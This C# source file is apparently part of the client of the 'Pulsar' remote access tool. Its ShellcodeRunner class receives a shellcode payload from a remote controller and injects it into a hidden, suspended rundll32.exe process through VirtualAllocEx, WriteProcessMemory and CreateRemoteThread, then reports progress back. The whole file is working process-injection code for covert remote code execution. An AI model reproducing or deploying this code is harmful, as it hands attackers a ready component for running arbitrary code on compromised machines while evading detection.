using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Networking;

namespace Pulsar.Client.FunStuff
{
    internal class ShellcodeRunner
    {
        public void Handle(DoSendBinFile message, ISender client)
        {
            if (message?.Data == null || message.Data.Length == 0)
            {
                client.Send(new SetStatus { Message = "Error: Empty payload" });
                return;
            }

            new Thread(() =>
            {
                try
                {
                    CreateDedicatedProcess(message.Data, client);
                }
                catch (Exception ex)
                {
                    client.Send(new SetStatus { Message = $"Error: {ex.Message}" });
                }
            })
            {
                IsBackground = true
            }.Start();
        }

        private void CreateDedicatedProcess(byte[] shellcode, ISender client)
        {
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.dwFlags = 0x00000001;
            startupInfo.wShowWindow = 0;

            client.Send(new SetStatus { Message = $"Creating dedicated process for {shellcode.Length} bytes..." });

            string commandLine = "rundll32.exe kernel32.dll,SleepEx 2147483647";

            bool success = CreateProcess(
                null,
                commandLine,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW,
                IntPtr.Zero,
                null,
                ref startupInfo,
                out procInfo);

            if (!success)
            {
                int error = Marshal.GetLastWin32Error();
                throw new Exception($"CreateProcess failed: 0x{error:X8}");
            }

            IntPtr remoteMemory = IntPtr.Zero;
            IntPtr remoteThread = IntPtr.Zero;

            try
            {
                client.Send(new SetStatus { Message = $"Created suspended process (PID: {procInfo.dwProcessId})" });

                remoteMemory = VirtualAllocEx(
                    procInfo.hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    AllocationType.COMMIT | AllocationType.RESERVE,
                    MemoryProtection.EXECUTE_READWRITE);

                if (remoteMemory == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"VirtualAllocEx failed: 0x{error:X8}");
                }

                client.Send(new SetStatus { Message = $"Allocated memory at: 0x{remoteMemory:X}" });

                uint bytesWritten = 0;
                if (!WriteProcessMemory(procInfo.hProcess, remoteMemory, shellcode, (uint)shellcode.Length, ref bytesWritten))
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"WriteProcessMemory failed: 0x{error:X8} - {bytesWritten}/{shellcode.Length} bytes");
                }

                client.Send(new SetStatus { Message = $"Wrote {bytesWritten} bytes to process memory" });

                remoteThread = CreateRemoteThread(
                    procInfo.hProcess,
                    IntPtr.Zero,
                    0,
                    remoteMemory,
                    IntPtr.Zero,
                    0,
                    out uint shellcodeThreadId);

                if (remoteThread == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"CreateRemoteThread failed: 0x{error:X8}");
                }

                client.Send(new SetStatus { Message = $"Created shellcode thread (ID: {shellcodeThreadId})" });

                ResumeThread(procInfo.hThread);

                CloseHandle(remoteThread);
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);

                client.Send(new SetStatus { Message = $"Shellcode executed in rundll32.exe (PID: {procInfo.dwProcessId}, Thread: {shellcodeThreadId})" });

            }
            catch
            {
                if (remoteThread != IntPtr.Zero) CloseHandle(remoteThread);
                TerminateProcess(procInfo.hProcess, 0);
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);
                throw;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            ref uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [Flags]
        private enum ProcessCreationFlags : uint
        {
            CREATE_SUSPENDED = 0x00000004,
            CREATE_NO_WINDOW = 0x08000000
        }

        [Flags]
        private enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000
        }

        [Flags]
        private enum MemoryProtection : uint
        {
            EXECUTE_READWRITE = 0x40
        }
    }
}